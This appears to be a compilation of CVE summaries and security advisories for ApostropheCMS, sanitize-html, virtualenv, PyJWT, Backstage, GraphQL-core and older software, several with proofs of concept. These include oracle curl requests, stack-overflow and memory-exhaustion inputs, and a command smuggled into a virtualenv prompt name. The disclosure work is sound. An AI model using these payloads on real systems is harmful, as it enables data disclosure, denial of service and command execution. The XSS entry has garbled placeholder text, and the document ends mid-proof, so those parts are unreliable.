cves.summary: Buffer overflow in AbsoluteTelnet before 2.12 RC10 allows remote attackers to execute arbitrary code via a long window title.

The Application Messaging Gateway for PeopleTools 8.1x before 8.19, as used in various PeopleSoft products, allows remote attackers to read arbitrary files via certain XML External Entities (XXE) fields in an HTTP POST request that is processed by the SimpleFileHandler handler.

In Splunk Enterprise versions below 10.4.4, 10.2.8, and 10.0.11, an unauthenticated user could send repeated requests to the Edge Processor package download endpoint in the Splunk Pipeline Builders app. The requests could cause the Splunk daemon to consume excessive system resources and potentially stop responding.
The vulnerability is possible because the endpoint accepts package download requests without authentication and reads and base64-encodes the complete package in memory for each request.
After upgrading, prepare all existing Edge Processor instances, turn on authentication for Edge Processor package downloads, and restart Splunk Enterprise. For more information, see Enable authentication for Edge Processor package downloads (https://help.splunk.com/en/data-management/process-data-at-the-edge/use-edge-processors-for-splunk-enterprise/10.4/administer-edge-processors/enable-authentication-for-edge-processor-package-downloads).

A buffer overflow vulnerability in the Brotli decoder (c/dec/decode.c) in Google Brotli versions 1.0.3 through 1.2.0 on all platforms allows a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial of service, or potentially execute arbitrary code using a crafted Brotli-compressed stream.

Users need to update any Brotli libraries or binaries between 1.0.3 through 1.2.0 to the latest available version: 1.0.10 or 1.1.1 or 1.2.1.

### Summary
ApostropheCMS lets a module expose an anonymous read API by setting `publicApiProjection`, which whitelists the document fields unauthenticated callers may see. The public REST GET handler applies every launderable query builder from the query string *before* forcing that projection. Two of those builders, `search` and `sort`, operate on the underlying documents rather than the projected output, and neither is checked against the projection. An unauthenticated attacker can therefore:

- use `?search=<word>` as a **value oracle** to confirm and locate documents by the content of a field the projection was meant to hide, and
- use `?sort[hiddenField]=1` as an **ordering oracle** to rank documents by a hidden field's value.

This is the same confidentiality-bypass class already patched for the `choices`/`counts` builders (gated by `choicesFieldAllowedByProjection`). That gate was never applied to `search` or `sort`.

### Details
For an anonymous caller, `getRestQuery` (piece types: `modules/@apostrophecms/piece-type/index.js:1142`; pages: `modules/@apostrophecms/page/index.js`) does:

```js
const query = self.find(req).attachments(true);
query.applyBuildersSafely(req.query);            // (1) apply ALL launderable builders from the query string
...
query.project({ ...self.options.publicApiProjection, cacheInvalidatedAt: 1 }); // (2) force read projection
query.set('publicApiProjection', self.options.publicApiProjection);            // (3) used only by the choices/counts gate
```

`applyBuildersSafely` (`modules/@apostrophecms/doc-type/index.js:3327`) runs any builder that has a `launder` method. `search` and `sort` both have one (`doc-type/index.js:2288` and `2127`), so `?search=` and `?sort[...]=` are honored for anonymous requests.

**Search vector.** The `search` builder adds `{ $text: { $search: <user input> } }` (`doc-type/index.js:2282`). The `$text` index covers `highSearchText` / `lowSearchText` / `title` / `searchBoost` (`modules/@apostrophecms/doc/index.js:612`). `highSearchText` / `lowSearchText` are built at save time by `@apostrophecms/search:getSearchTexts` → `apos.schema.indexFields(schema, doc, texts)` (`modules/@apostrophecms/search/index.js:377`), which indexes every schema field where `searchable !== false` (the default for string/text fields). `publicApiProjection` does not imply `searchable: false`. Step (2) narrows the output but not the `$text` filter, so the response returns the projected `{title, slug, _id}` of exactly the documents whose hidden field contains the searched word.

**Sort vector.** `finalizeSort` (`doc-type/index.js:3526`) forwards raw user sort keys to MongoDB (it only rewrites fields flagged `sortify: true`). `?sort[hiddenField]=1` orders results by a projection-excluded field. Combined with `perPage`/`page`, an attacker can page through the fully ordered set.

Neither builder consults `publicApiProjection`, whereas `choices`/`counts` are gated at `doc-type/index.js:2807` via `choicesFieldAllowedByProjection`.

### PoC
**Preconditions:** the piece/page type sets `publicApiProjection`, and its schema has at least one searchable (default) or sortable field not included in the projection.

Test type: `article` exposes only `title`, `slug`, `_id`, but has hidden `secret` (integer) and `secretNote` (searchable string):

```js
export default {
  extend: '@apostrophecms/piece-type',
  options: { publicApiProjection: { title: 1, slug: 1, _id: 1 } },
  fields: { add: {
    secret:     { type: 'integer' },
    secretNote: { type: 'string' }   // searchable by default; NOT in the projection
  } }
};
```

Five articles were inserted and published via the authenticated REST API:
`A.secret=50, secretNote="zzsecretalpha"`; `B=10/zzsecretbravo`; `C=90/zzsecretcharlie`; `D=30/zzsecretdelta`; `E=70/zzsecretecho`.
The insert responses confirm the hidden `secretNote` value is written into the search index, e.g. for A: `"highSearchText": "... zzsecretalpha"`, `"lowSearchText": "... zzsecretalpha"`.

Anonymous requests (no credentials, no session):

```bash
# [1] Baseline: projection hides secret/secretNote on direct read
curl -s 'http://localhost:3000/api/v1/article?perPage=1'

# [2] Search oracle: value exists ONLY in hidden secretNote
curl -s 'http://localhost:3000/api/v1/article?search=zzsecretalpha'
curl -s 'http://localhost:3000/api/v1/article?search=zznotpresentxyz'

# [3] Sort oracle: order by hidden integer field
curl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=1'
curl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=-1'

# Negative control: projection override is blocked
curl -s 'http://localhost:3000/api/v1/article?project%5BsecretNote%5D=1&perPage=1'
```

Results (verified on ApostropheCMS 4.32.2, MongoDB 7.0):

| Request (anonymous)       | Observed                                          | Verdict                               |
| ------------------------- | ------------------------------------------------- | ------------------------------------- |
| `GET /api/v1/article`     | `_id,title,slug,type,metaType,cacheInvalidatedAt` | projection works on direct read       |
| `?search=zzsecretalpha`   | only Article A (with textScore)                   | **leak**: locates doc by hidden field |
| `?search=zznotpresentxyz` | 0 results                                         | oracle confirmed                      |
| `?sort[secret]=1`         | B, D, A, E, C  (= 10,30,50,70,90)                 | **leak**: full hidden ordering        |
| `?sort[secret]=-1`        | C, E, A, D, B                                     | reverse confirmed                     |
| `?project[secretNote]=1`  | secretNote absent                                 | gated (projection override blocked)   |

### Impact
Unauthenticated, network-reachable partial disclosure of fields the developer explicitly restricted with `publicApiProjection`:

- **Search oracle:** confirm and locate documents by words in hidden fields (e.g. internal notes, contact emails, draft metadata, moderation/status flags), returning the `title`/`slug`/`_id` of matches.
- **Sort oracle:** full ordering of documents by a hidden field. With one known reference value or a paging binary search, exact hidden values can be recovered.

No authentication or user interaction required. Not a full field dump, but a targeted oracle over exactly the data the projection is meant to conceal. Affects sites that configure `publicApiProjection` on piece types or pages, up to and including 4.32.2 (same code path present on current `main`).

### Remediation
Gate `search`, `sort` (and `autocomplete`, which feeds `search`) on the public API path the same way `choices`/`counts` are gated. When `publicApiProjection` is in force:

- **sort:** reject or drop any sort key not permitted by the projection, reusing `choicesFieldAllowedByProjection`.
- **search:** restrict full-text search to fields the projection exposes (e.g. a projection-scoped search text), or refuse the `search` builder when the projection excludes any searchable field.

cves.summary: ### Summary The color field accepts any string that *begins* with a valid `rgb()` / `hsl()` color, because `TinyColor.isValid` does not anchor its match at the end of the string. An authenticated user with edit rights can store arbitrary HTML after a valid color prefix. When the stored value is rendered , the payload executes, resulting in stored XSS. ### Details Server-side validation of the color field relies on TinyColor: ```js const { TinyColor } = require('@ctrl/tinycolor'); if (!new TinyColor(value).isValid) throw self.apos.error('invalid'); ``` TinyColor's `rgb`/`hsl` matchers are not anchored at the end of the string, while hex matchers are. Tested with @ctrl/tinycolor | Input | `isValid` | |---|---| | `rgb(1,2,3)` | `true` | | `rgb(1,2,3)` | `true` | | `hsl(0,100%,50%);--x:1}` | `true` | | `#ff0000` | `false` | The value is saved to MongoDB unchanged (not normalized to hex8). ### Relation to GHSA-97v6-998m-fp4g GHSA-97v6 addressed CSS custom property injection escaping a ``" OR "a separate HTML sink at X is exploitable"]. Fixing the validation (requiring the full string to be a color, or storing only TinyColor's normalized output) would close both. ### Impact Any user with edit permission can plant persistent JavaScript that runs in the browser of visitors and administrators viewing the affected page, enabling session hijacking and actions as an admin. ### Suggested fix Reject values unless the entire string is a valid color, e.g. normalize on save: ```js const c = new TinyColor(value); if (!c.isValid) throw self.apos.error('invalid'); value = c.toHex8String(); // store only normalized output ```

cves.summary:
### Summary

Since 2.18.0, when an `<iframe>` is not allowed and `disallowedTagsMode` is `'discard'` (the defaults),
its raw-text content is re-sanitized by a recursive call to `sanitizeHtml(text, options)` (the change
from #5564, fixing #5550). The recursion has no bound and starts each nested call with a fresh state.
Two consequences, both absent from 2.17.7 and 2.17.4:

1. A few kilobytes of unclosed `<iframe>` tags throw `RangeError: Maximum call stack size exceeded`
   with the default options. Any application that sanitizes untrusted HTML with 2.18.0 can be made to
   throw on a small crafted input.
2. `nestingLimit` is not enforced across a discarded iframe: each nested iframe restarts the depth
   count at zero, so the output can be nested arbitrarily deep regardless of the configured limit.

### Affected versions

- 2.18.0 (the current `latest`), and the `main` branch at the time of writing (the recursive call is
  still in `packages/sanitize-html/index.js`, in the `ontext` handler, branch
  `tag === 'iframe' && !tagAllowed(tag) && options.disallowedTagsMode === 'discard'`).
- Not affected: 2.17.7 and 2.17.4 (tested with the same inputs below).

Tested with Node.js v26.7.0.

### Reproduction 1: stack overflow with the default options

```js
const sanitizeHtml = require('sanitize-html');

// with 2.18.0:
sanitizeHtml('<iframe>'.repeat(1000));  // 8,000 chars: returns ''
sanitizeHtml('<iframe>'.repeat(2000));  // 16,000 chars: throws RangeError: Maximum call stack size exceeded
sanitizeHtml('<iframe>'.repeat(20000)); // 160,000 chars: throws RangeError: Maximum call stack size exceeded
```

Results:

| input | 2.17.4 | 2.17.7 | 2.18.0 |
|---|---|---|---|
| `'<iframe>'.repeat(1000)` | ok | ok | ok |
| `'<iframe>'.repeat(2000)` | ok | ok | RangeError |
| `'<iframe>'.repeat(20000)` | ok | ok | RangeError |

The threshold depends on the remaining stack, so it is lower when `sanitizeHtml` is called from an
already deep call stack (for example inside a server-side rendering pass).

### Reproduction 2: `nestingLimit` is bypassed

```js
const sanitizeHtml = require('sanitize-html');

const input = ('<iframe>' + '<b>'.repeat(3)).repeat(50) + 'x';
const out = sanitizeHtml(input, { allowedTags: ['b'], nestingLimit: 3 });
// maximum nesting depth of <b> in `out`:
//   2.17.4: 2    2.17.7: 0 (fallback escaped as text)    2.18.0: 150
```

Without an iframe, the same options cap the output at three nested `<b>` in all three versions. With
`k` repetitions of `'<iframe>' + '<b>'.repeat(3)`, 2.18.0 returns `3 * k` nested `<b>` (measured for
k = 1, 5, 50: depth 3, 15, 150).

### Cause

In 2.18.0 the `ontext` handler does:

```js
} else if (
  tag === 'iframe' &&
  !tagAllowed(tag) &&
  options.disallowedTagsMode === 'discard'
) {
  result += sanitizeHtml(text, options);
}
```

Because htmlparser2 treats `<iframe>` as a raw-text element, the text of an unclosed iframe is the whole
remainder of the input; re-parsing it can meet another unclosed `<iframe>`, and so on, one stack frame
(and one full re-parse) per iframe. The nested call also starts with its own `depth`, so tags inside the
fallback are not counted against `nestingLimit` together with the enclosing tags.

### Possible directions

Not a patch, only what would close both effects: bound the recursion (or process the fallback without
recursing), and carry the current depth into the nested sanitization so that `nestingLimit` applies to
the whole output.

cves.summary:
## Review scope and evidence limits

Package: @apostrophecms/import-export, version 3.7.0.

Release tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).

Current main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.

The importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. 

## Import API bypasses publication roles for protected content

The import gate in canImportOrExport() checks the type's import configuration and view permission. The write helpers then call document-manager insert/update directly, including operations on published variants. We did not find the normal publish permission check or beforePublish transition in these helpers. Core permissions intentionally distinguish editRole and publishRole, and the ordinary publication lifecycle enforces that distinction.

The reported security boundary is a content type that an editor may edit but whose publication is reserved for a stronger role. Direct public-state changes through import must enforce the same publication authority. The original report describes unauthorized creation, replacement, or removal of published content under that configuration.

Suggested remediation: centralize authorization for import writes; require publish permission for every non-autopublished published variant, authorize each concrete target, and preflight the complete import before persistent changes. Preserve authorized draft imports and the intended behavior of autopublished types.

Source references:
- [Import write helpers](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js)
- [Import permission gate](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/index.js)
- [Core role distinctions](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/permission/index.js)
- [Core insert/update/publication permission hooks](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/doc/index.js)

## Coordination

Vivek R / Winfunc
Original reporting team: Mufeed VH / Winfunc

## Review scope and evidence limits

Package: @apostrophecms/import-export, version 3.7.0.

Release tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).

Current main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.

The importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. Please refer to that existing private attachment.

## Archive duplicate continuation permits unauthorized published-content replacement

The overrideDuplicates() continuation still accepts client-supplied replacement choices, rather than binding them to a server-maintained, user-owned duplicate analysis. The replacement and write helpers do not establish a single canonical resource identity and authorization context before the update. This leaves the reported gap between draft editing authority and the published target selected for replacement unresolved at source level.

The original report describes a contributor crossing the publication boundary through duplicate replacement on an import-enabled localized type. We have not repeated that end-to-end sequence on 3.7.0.

Suggested remediation: bind continuation state to the initiating user, archive, job, permitted source/target mapping, locale and mode; reject inconsistent identity metadata; derive permissions from the actual loaded target and require publication authority for published targets.

Source: overrideDuplicates(), replaceDocId(), and insertOrUpdateDoc() in the [importer](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js).

Vivek R / Winfunc

cves.summary:
## Review scope and evidence limits

Package: @apostrophecms/import-export, version 3.7.0.

Release tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).

Current main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.

The importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. Please refer to that existing private attachment.

## Import archive extraction lacks resource quotas and failure cleanup

The current gzip extractor handles destination write errors and waits for write completion; those parts of the original report should no longer be treated as unchanged. The import routes also now require a logged-in user before big-upload processing, as covered by GHSA-86wm-68pq-5jwq.

However, extract() still writes expanded archive entries without per-entry, aggregate decompressed-byte, or entry-count quotas. Archive parsing still precedes document-type authorization. If extraction or parsing fails, import() notifies and rethrows before the later storage.remove() call, with no unconditional cleanup around that lifecycle. The reported residual risk is excessive storage consumption and retained extraction/staging artifacts from authenticated imports. Handling a write error and requiring login do not enforce a storage budget.

Suggested remediation: add configurable streaming quotas based on actual decompressed bytes, cap entries and allowed entry types, bound concurrent imports, and clean local and uploadfs artifacts on every failure. Retain continuation artifacts only under explicit ownership, expiry and total-storage limits.

Source references:
- [Gzip extractor](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/formats/gzip.js)
- [Import lifecycle and cleanup](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js)
- [Related authentication fix](https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-86wm-68pq-5jwq)

cves.summary:
### Summary

The bash `activate` script escapes the environment name for only one of the two passes bash makes over `PS1`, so a
backslash in the name undoes the escaping and a name containing `\$(...)` runs as commands in the user's shell each
time bash draws the prompt.

### Affected area

`src/virtualenv/activation/bash/activate.sh`, the block that prepends the environment name to `PS1`.

### Attacker-controlled input

The environment name: the environment directory's name, or the `--prompt` or `VIRTUALENV_PROMPT` value. An attacker
needs to influence it, for example through a CI job or wrapper tool that passes a branch, project or job name through,
or a directory in a cloned repository or unpacked archive. `--prompt .` takes the current directory's name.

### Details

bash handles `PS1` in two passes each time it draws the prompt: it first decodes backslash prompt escapes, turning `\\`
into `\` and `\$` into `$` (or `#` for root), and then runs parameter expansion, command substitution and arithmetic
expansion on the result. Since 21.13.0 the script escapes backslashes, dollar signs and backticks in the name, but only
for the second pass, so the decode pass strips the escaping that a backslash in the name precedes. Releases before
21.13.0 do not escape the name at all. A bash running as root decodes `\$` to `#`, so the payload shows the wrong text
there but runs nothing. zsh does no decode pass and is not affected.

### Proof of concept

```console
$ virtualenv --prompt 'a\$(touch PWNED)' env
$ bash --norc --noprofile -c 'source env/bin/activate; printf "%s" "${PS1@P}"'
$ ls PWNED
PWNED
```

### Impact

Arbitrary command execution in the shell of a user who sources the `activate` script of an environment whose name an
attacker influenced, with that user's privileges, once per prompt draw.

### Versions tested

21.14.6 with bash 5.2.15 on Debian bookworm, as an unprivileged user and as root.

### Known mitigation

Set `VIRTUAL_ENV_DISABLE_PROMPT=1` before you source `activate`, which leaves `PS1` alone, or run `shopt -u promptvars`
if your prompt does not need expansion. Check the name of an environment you did not create before you source its
`activate`.

### Latest release

- [x] The problem reproduces on the latest virtualenv release.

21.14.6

### Patches

Fixed in 21.14.7. Under bash, `activate` now escapes backslashes, dollar signs and backticks for both passes, so the
example above runs nothing and the prompt shows the name as given. zsh keeps the single escaping it needs.
Fix: https://github.com/pypa/virtualenv/commit/c3104e02474b652832a9bbaae79f6e1696296932

### Credits

Found while running the virtualenv test suite as root inside the Anthropic OSS Scanner build image.

### Summary

PyJWT 2.13.0 contains an incomplete defense against algorithm confusion when
an application mixes symmetric and asymmetric algorithms in one verification
path. A public RSA, EC, or OKP JWK can be accepted as an HMAC secret when it
is wrapped in a JWKS object, nested in an array, or represented in another
container form that does not expose a top-level `kty` member.

### Impact

An attacker who knows the public key material can forge HS256/HS384/HS512
tokens if the application simultaneously:

* allows both HS* and asymmetric algorithms;
* passes raw public JWK/JWKS JSON as `key=`; and
* uses that same value as the HMAC secret.

This can allow forged JWT claims in affected application configurations. The
issue does not affect applications that keep symmetric and asymmetric
verification paths separate and follow PyJWT's algorithm-selection guidance.

### Fix status

The fix is on `master` in commit `801cd12` (`fix: reject public JWK container
HMAC keys`). `HMACAlgorithm.prepare_key` now rejects public JWK members found in
objects, arrays, nested containers, BOM/UTF variants, and recursion-limit
inputs. It also recognizes escaped JSON member names without treating ordinary
string values as JWKs. Ordinary JSON secrets remain accepted byte-for-byte.

The change was tested with focused regression tests and the full local tox
matrix. Available Python 3.9, 3.12, and 3.13 crypto/no-crypto suites, mypy,
package metadata, and coverage passed; unavailable interpreters were skipped
by the project configuration. A fresh independent Astra/max security review
accepted the final diff with no blocking findings.

The affected range is `= 2.13.0`. The fix is on the unreleased development
branch; the patched version will be recorded when a released 2.x version
containing the fix is available. This advisory is being moved to draft pending
that release.

### Reporter credit

Credit: Charles Vosburgh / Trilobyte.

### Original report

The original report and reproduction package are retained in the private
advisory record.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

cwe.name: Improper Verification of Cryptographic Signature

cves.summary:
### Summary

PyJWT 2.13.0 `PyJWKClient` followed HTTP redirects while fetching a JWKS,
without validating the redirect destination. A configured trusted endpoint
could therefore redirect the client to a different host.

### Impact

When an application uses `PyJWKClient` with caller-supplied request headers and
an attacker can influence the configured endpoint's response, the redirected
request could expose those headers and the redirected response could be used as
authoritative key material. This could cause JWKS trust poisoning and, in
affected mixed-configuration applications, forged JWT acceptance. The issue
requires an attacker-influenced redirect from the configured JWKS endpoint; it
is not triggered by a token `kid` alone.

### Affected versions

PyJWT `<= 2.13.0`.

### Fix

The issue is fixed on `master` in commit
[`0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56`](https://github.com/jpadilla/pyjwt/commit/0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56).
`PyJWKClient` now disables automatic redirects for JWKS fetches. Regression
tests verify that a redirect is rejected without contacting its destination,
while normal fetches, headers, caching, errors, timeouts, and SSL context remain
covered.

The fix is present in the unreleased development branch. The patched version
will be recorded after a released PyJWT 2.x version containing the fix is
confirmed.

### Credit

Credit: the original reporter of GHSA-9v7f-9g4p-ffgj. Additional redirect
header-leak and cache-poisoning evidence from the newer duplicate report
GHSA-43g3-98cx-x446 is preserved in the duplicate record and informed this
canonical advisory update.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

cwe.name: Exposure of Sensitive Information to an Unauthorized Actor

cves.summary: Buffer overflow in Avirt Soho 4.3 allows remote attackers to cause a denial of service (crash) via (1) a large GET request to port 1080 or (2) a large GET request of % characters to port 8080.

Buffer overflow in eauth in Load Sharing Facility 4.x, 5.x, and 6.x allows local users or remote attackers within the LSF cluster to cause a denial of service (segmentation fault) and possibly execute arbitrary code via a long LSF_From_PC parameter.

Load Sharing Facility (LSF) 4.x, 5.x, and 6.x uses the LSF_EAUTH_UID environment variable, if it exists, instead of the real UID of the user, which could allow remote attackers within the local cluster to gain privileges.

The mod_authz_svn module in Subversion 1.0.7 and earlier does not properly restrict access to all metadata on unreadable paths, which could allow remote attackers to gain sensitive information via (1) svn log -v, (2) svn propget, or (3) svn blame, and other commands that follow renames.

Multiple vulnerabilities in the RLE (run length encoding) decoders for libtiff 3.6.1 and earlier, related to buffer overflows and integer overflows, allow remote attackers to execute arbitrary code via TIFF files.
Buffer overflow in layer2.c in mpg123 0.59r and possibly mpg123 0.59s allows remote attackers to execute arbitrary code via a certain (1) mp3 or (2) mp2 file.

SMTP service in (1) Microsoft Windows 2000 and (2) Internet Mail Connector (IMC) in Exchange Server 5.5 does not properly handle responses to NTLM authentication, which allows remote attackers to perform mail relaying via an SMTP AUTH command using null session credentials.
SMTP service in Microsoft Windows 2000, Windows XP Professional, and Exchange 2000 allows remote attackers to cause a denial of service via a command with a malformed data transfer (BDAT) request.
ImageCast Control Center 4.1.0 allows remote attackers to cause a denial of service (resource exhaustion or system crash) via a long string to port 12002.
Directory traversal vulnerability in eXtropia bbs_forum.cgi 1.0 allows remote attackers to read arbitrary files via a .. (dot dot) attack on the file parameter.

### Impact

When using the Azure Blob Storage provider, an authenticated Backstage user may be able to read restricted TechDocs content when entity-level permissions are enabled. Deployments that intentionally disable the default backend authentication policy may have broader exposure.

### Patches

Patched in `@backstage/plugin-techdocs-backend` version `2.2.4`

### Workarounds

- Restrict access to the TechDocs backend to users who are permitted to view all stored documentation until an upgrade can be applied.
- Keep the default backend authentication policy enabled.

cwe.name: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

cves.summary:
### Impact

Catalog entity providers for Azure Blob Storage and AWS S3 did not sufficiently validate storage object paths, which could allow catalog descriptors to be read from outside the intended storage boundary. Access is limited to locations reachable by the backend's configured credentials.

### Patches

- `@backstage/plugin-catalog-backend-module-azure` version `0.3.21`
- `@backstage/plugin-catalog-backend-module-aws` version `0.4.27`
- `@backstage/backend-defaults` version `0.7.18`

### Workarounds

- Restrict blob and object creation or renaming in configured catalog storage sources to trusted principals.
- Scope Backstage's Azure and AWS reader credentials and network access to the intended storage boundaries.
- Disable an affected catalog provider if those restrictions cannot be enforced.

cwe.name: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

cves.summary:
### Impact

An authenticated Backstage user could craft a request URL that causes the proxy-backend to forward the request to a path outside the configured base path on the target server. This is limited to target servers already configured as proxy endpoints and requires Backstage authentication by default.

### Patches

Patched in `@backstage/plugin-proxy-backend` version `0.6.17`

### Workarounds

- Deploy a reverse proxy or WAF in front of Backstage that normalizes request paths before they reach the backend.

cwe.name: Improper Input Validation

cves.summary: Directory traversal vulnerability in WorldClient.cgi in WorldClient for Alt-N Technologies MDaemon 5.0.5.0 and earlier allows local users to delete arbitrary files via a ".." (dot dot) in the Attachments parameter.

SOAP::Lite 0.50 through 0.52 allows remote attackers to load arbitrary Perl functions by suppling a non-existent function in a script using a SOAP::Lite module, which causes the AUTOLOAD subroutine to trigger.
AOL ICQ 2002a Build 3722 allows remote attackers to cause a denial of service (crash) via a malformed .hpf file.
An installation of Red Hat uses DES password encryption with crypt() for the initial password, instead of md5.
Directory traversal vulnerability in Info-ZIP UnZip 5.42 and earlier allows attackers to overwrite arbitrary files during archive extraction via a .. (dot dot) in an extracted filename.
Info-ZIP UnZip 5.42 and earlier allows attackers to overwrite arbitrary files during archive extraction via filenames in the archive that begin with the '/' (slash) character.
ZoneAlarm Pro 4.5.538.001 and possibly other versions allows remote attackers to bypass e-mail protection via attachments whose names contain certain non-English characters.

### Summary

The parser's `max_tokens` limit — the documented defence against oversized GraphQL
documents — did not count comment tokens. A document padded with comments could
therefore pass a `max_tokens` check of any size while still allocating one `Token`
object per comment, all of which stay reachable for the lifetime of the parsed
document. A 38 MB comment-padded payload allocated roughly 92 MB of additional
resident memory with `max_tokens=5` in force.

### Details

`Lexer.lookahead()` reads tokens one at a time and skips over comments, returning only
the first non-comment token. Each skipped comment is nevertheless fully tokenized,
allocated as a `Token` object, and linked into the persistent token list via
`token.next` / `token.prev` — the chain that powers source-location reporting, and
which is retained as long as the document is.

`Parser.advance_lexer()` incremented the token counter only for the tokens the lexer
actually returned. Comments were therefore invisible to the accounting, and
`max_tokens` bounded only the *non-comment* tokens.

The practical consequence is a gap between what users reasonably believe `max_tokens`
protects and what it did protect. The limit was not broken for ordinary documents —
real tokens were still capped correctly — so the shortfall was not observable without
specifically testing comment padding.

As with the companion issue, the payload compresses extremely well (`# c\n` repeated),
so body-size limits and WAF inspection applied to the compressed request do not see
its true size, while the framework decompresses it in memory before the parser is
reached.

### Proof of concept

```python
import gc
import resource
from graphql import parse

# 100,000 comments, a 5-token query, and max_tokens=5 — accepted.
query = "# c\n" * 100_000 + "{ a }"
parse(query, max_tokens=5)          # no error raised

# Memory amplification.
big = "# padding comment used to amplify memory per token\n" * 500_000 + "{ a }"
gc.collect()
before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
parse(big, max_tokens=5)            # ~38 MB source
after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
print(f"RSS delta: +{(after - before) / 1024:.0f} MB")
```

Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64: the 391 KB payload
parsed in 127 ms, and the 38.1 MB payload produced an RSS delta of **+92 MB** — about
2.4× the source size, on top of the source string itself.

### Impact

Denial of service through memory exhaustion. A modest number of concurrent requests
can push a worker past a typical 256 MB or 512 MB container limit and trigger an
OOM kill. No authentication is required, and no data is disclosed or modified.

Depth limiters and complexity analyzers do not help: they run on the AST after parsing
has already succeeded, and the document contains only five real tokens.

### Patches

Fixed in **3.2.12** and **3.3.0rc1**.

`Parser.advance_lexer` now counts every token consumed, including the comment tokens
the lexer skips between the previously focused token and the new one, and including
the advance onto EOF so that trailing comments are covered. `max_tokens` therefore now
bounds every `Token` the parser allocates.

Note the behaviour change: **comments now count toward `max_tokens`.** A
comment-heavy document that was previously accepted may now be rejected. If you parse
documents containing substantial comments — SDL files with documentation comments, for
instance — and you set `max_tokens`, you may need to raise the limit. The
`token_count` attribute of a parsed document likewise now includes comments.

### Workarounds

If you cannot upgrade, apply a request body-size limit to the **decompressed** body
before the document reaches `parse()`.

Such a limit is worth keeping after upgrading as well: `max_tokens` is one guard among
several and bounds the token count, not the overall cost of a request.

### References

- GraphQL specification § 2.1.4 — Comments

### Credits

Reported by @BZHunt, who also reviewed the fixes
before release. In memory of ZaX, who was the driving force behind this discovery.

cwe.name: Uncontrolled Resource Consumption

cves.summary:
### Summary

The `OverlappingFieldsCanBeMerged` validation rule can be driven into quadratic — and
in the worst case `O(n²·m²)` — running time by a small, highly compressible query. A
single 364 KB document can occupy one CPU core for over five minutes during
*validation*, before any resolver runs. Because the rule is part of `specified_rules`
and therefore enabled by default, every GraphQL-core based server is affected at
default settings.

### Details

`OverlappingFieldsCanBeMerged` compares every pair of fields that share a response
name and recurses into their sub-selections. The memoization added for
CVE-2023-26144 (`GHSA-9pv7-vfvm-6vr7`) is keyed by **named fragment** identity, so it
does not cover this path: inline fragments are flattened into the parent selection
set before the cache is consulted, and therefore every pair is re-compared from
scratch at every nesting level.

Repeating an inline fragment that selects the same response name at two nesting
levels multiplies the two effects. There was no comparison budget and no validation
timeout, so the rule ran to completion regardless of cost.

The cost is incurred in the **validation phase**, which is what makes this hard to
defend against from outside the library: query-depth limiters, complexity analyzers
and cost estimators all operate on the parsed document *after* validation, and the
malicious document is trivially shallow (depth 3, complexity 1). The payload is also
one short string repeated many times, so it compresses to a few kilobytes and slips
past body-size limits and WAF inspection that only see the compressed request.

### Proof of concept

```python
import time
from graphql import build_schema, parse, validate

schema = build_schema(
    "type Query { field: Node } type Node { f: Node, g: Node, x: String }"
)

def gen(n: int, m: int) -> str:
    inner = " ".join(["... on Node { x }"] * m)
    outer = " ".join([f"... on Node {{ f {{ {inner} }} }}"] * n)
    return f"{{ field {{ {outer} }} }}"

